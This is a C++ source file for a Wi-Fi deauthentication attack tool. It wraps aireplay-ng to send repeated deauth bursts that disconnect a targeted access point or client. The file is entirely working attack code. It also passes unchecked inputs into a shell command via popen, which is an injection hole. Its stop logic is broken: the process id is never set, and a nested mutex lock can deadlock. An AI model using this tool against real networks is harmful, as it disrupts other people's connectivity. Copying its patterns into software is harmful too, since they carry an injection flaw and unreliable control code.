#include "../include/DeauthAttacker.h"
#include <iostream>
#include <chrono>
#include <thread>
#include <array>
#include <memory>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#include <tchar.h>
#else
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>
#include <spawn.h>
#endif

DeauthAttacker::DeauthAttacker() 
    : isAttacking_(false)
#ifdef _WIN32
    , processHandle_(nullptr)
#else
    , processId_(0)
#endif
{
}

DeauthAttacker::~DeauthAttacker() {
    stopAttack();
}

void DeauthAttacker::startDeauthAttack(const std::string& interface,
                                     const std::string& targetBssid,
                                     const std::string& clientBssid,
                                     int duration) {
    std::lock_guard<std::mutex> lock(mutex_);
    
    // Stop any existing attack
    if (isAttacking_) {
        stopAttack();
    }
    
    // Start new attack in a separate thread
    isAttacking_ = true;
    attackThread_ = std::make_unique<std::thread>(
        &DeauthAttacker::deauthWorker, this,
        interface, targetBssid, clientBssid, duration
    );
}

void DeauthAttacker::stopAttack() {
    {
        std::lock_guard<std::mutex> lock(mutex_);
        if (!isAttacking_) {
            return;
        }
        
        isAttacking_ = false;
        terminateProcess();
    }
    
    // Wait for the thread to finish
    if (attackThread_ && attackThread_->joinable()) {
        attackThread_->join();
    }
}

bool DeauthAttacker::isAttacking() const {
    std::lock_guard<std::mutex> lock(mutex_);
    return isAttacking_;
}

void DeauthAttacker::deauthWorker(const std::string& interface,
                                const std::string& targetBssid,
                                const std::string& clientBssid,
                                int duration) {
    try {
        // Calculate number of deauth bursts (one every 10 seconds)
        int bursts = (duration > 0) ? (duration + 9) / 10 : 1;
        bursts = std::max(1, bursts);
        
        for (int i = 0; i < bursts && isAttacking_; ++i) {
            // Build the aireplay-ng command
            std::string cmd = "aireplay-ng --deauth 5 ";
            
            // Add client BSSID if specified
            if (!clientBssid.empty()) {
                cmd += "-c " + clientBssid + " ";
            }
            
            // Add target BSSID and interface
            cmd += "-a " + targetBssid + " " + interface;
            
            std::cout << "⚡ Deauth burst " << (i + 1) << "/" << bursts << "..." << std::endl;
            
            // Execute the command
            std::string output = executeCommand(cmd);
            
            // Print the output if there was any
            if (!output.empty()) {
                std::cout << output << std::endl;
            }
            
            // Don't sleep after the last burst
            if (i < bursts - 1) {
                // Sleep for 10 seconds, but check isAttacking_ every second
                for (int j = 0; j < 10 && isAttacking_; ++j) {
                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "❌ Deauthentication error: " << e.what() << std::endl;
    } catch (...) {
        std::cerr << "❌ Unknown error in deauthentication thread" << std::endl;
    }
    
    // Ensure we clean up properly
    std::lock_guard<std::mutex> lock(mutex_);
    isAttacking_ = false;
}

std::string DeauthAttacker::executeCommand(const std::string& command) const {
    std::array<char, 128> buffer;
    std::string result;
    
#ifdef _WIN32
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(command.c_str(), "r"), _pclose);
#else
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(command.c_str(), "r"), pclose);
#endif
    
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    
    return result;
}

void DeauthAttacker::terminateProcess() {
#ifdef _WIN32
    if (processHandle_ != nullptr) {
        TerminateProcess(processHandle_, 0);
        CloseHandle(processHandle_);
        processHandle_ = nullptr;
    }
#else
    if (processId_ > 0) {
        // Send SIGTERM to the process group
        kill(-processId_, SIGTERM);
        
        // Wait for the process to terminate
        int status;
        waitpid(processId_, &status, 0);
        processId_ = 0;
    }
#endif
}
